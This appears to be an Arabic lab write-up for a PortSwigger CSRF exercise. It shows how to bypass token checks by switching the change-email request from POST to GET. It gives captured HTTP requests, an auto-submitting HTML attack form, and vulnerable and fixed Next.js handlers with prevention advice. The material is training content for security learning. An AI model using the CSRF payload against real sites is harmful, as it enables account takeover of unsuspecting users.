# Lab: CSRF where token validation depends on request method

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يتحقق من CSRF Token فقط في طلبات **POST**، ولكنه لا يتحقق منه في طلبات **GET**. سنستخدم طلب GET لتجاوز الحماية.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم الطلب

- ادخل إلى المختبر
- سجل الدخول بـ: `wiener:peter`
- اذهب إلى **My account**
- غير بريدك الإلكتروني إلى أي قيمة
- في Burp → **Proxy > HTTP history**، ابحث عن الطلب:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR-SESSION-COOKIE

email=wiener%40normal-user.net&csrf=TOKEN_VALUE
```

### الخطوة 2: فهم آلية التحقق

- أرسل الطلب إلى Repeater
- جرب تغيير قيمة `csrf` → سيتم رفض الطلب
- اضغط بزر الماوس الأيمن → **Change request method** (تحويل POST إلى GET)

```http
GET /my-account/change-email?email=wiener%40normal-user.net&csrf=wrong_token HTTP/1.1
```

**لاحظ:** الطلب ينجح حتى مع توكن خاطئ! لأن الخادم لا يتحقق من CSRF في طلبات GET.

### الخطوة 3: إنشاء HTML للهجوم (GET request)

استخدم هذا القالب:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hacked%40attacker.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

> **ملاحظة:** لن يتم إرسال أي CSRF token لأن الطلب GET.

### الخطوة 4: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML
- اضغط **Store**

### الخطوة 5: تجربة الهجوم على نفسك

- اضغط **View exploit**
- ارجع إلى حسابك وتأكد من أن بريدك الإلكتروني **تغير**

### الخطوة 6: تسليم الهجوم للضحية

- غير البريد الإلكتروني إلى قيمة مختلفة
- اضغط **Store**
- اضغط **Deliver to victim**

### الخطوة 7: حل المختبر

بمجرد تسليم الهجوم، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **كيف نجح التجاوز؟** | الخادم يتحقق من CSRF فقط في POST، لكنه لا يتحقق في GET |
| **لماذا هذا خطأ؟** | أي طلب يغير الحالة (مثل تغيير البريد) يجب أن يتحقق من التوكن بغض النظر عن الطريقة |
| **كيف حولنا الطلب؟** | باستخدام `method="GET"` في الـ form (أو حذف `method` فيصبح GET افتراضياً) |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

التحقق من CSRF Token يكون فقط لطلبات POST، بينما طلبات GET لا تخضع للتحقق.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
export default function handler(req, res) {
  const { email, csrf } = req.method === 'POST' ? req.body : req.query;
  const { sessionId } = req.cookies;

  // خطأ: يتحقق من CSRF فقط في طلبات POST
  if (req.method === 'POST') {
    if (!verifyCsrfToken(sessionId, csrf)) {
      return res.status(403).send('Invalid CSRF token');
    }
  }
  // GET requests تمر بدون أي تحقق!

  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
export default function handler(req, res) {
  const { email, csrf } = req.method === 'POST' ? req.body : req.query;
  const { sessionId } = req.cookies;

  // التصحيح: التحقق من CSRF في جميع الطلبات (باستثناء OPTIONS/HEAD)
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.method !== 'OPTIONS') {
    if (!verifyCsrfToken(sessionId, csrf)) {
      return res.status(403).send('Invalid CSRF token');
    }
  }

  // أفضل حل: منع أي طلب GET يغير الحالة نهائياً
  if (req.method === 'GET') {
    return res.status(405).send('Method not allowed');
  }

  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

**الخلاصة:** 
1. لا تسمح أبداً بـ GET لتغيير الحالة
2. تحقق من CSRF في جميع الطلبات التي تغير الحالة

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **لا تستخدم GET لتغيير البيانات:** GET يجب أن يكون للقراءة فقط.
2. **تحقق من CSRF في جميع الطلبات:** POST, PUT, DELETE, PATCH.
3. **استخدم SameSite Cookies:** `SameSite=Lax` أو `SameSite=Strict`.
4. **تحقق من Referer/Origin:** كطبقة دفاع إضافية.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
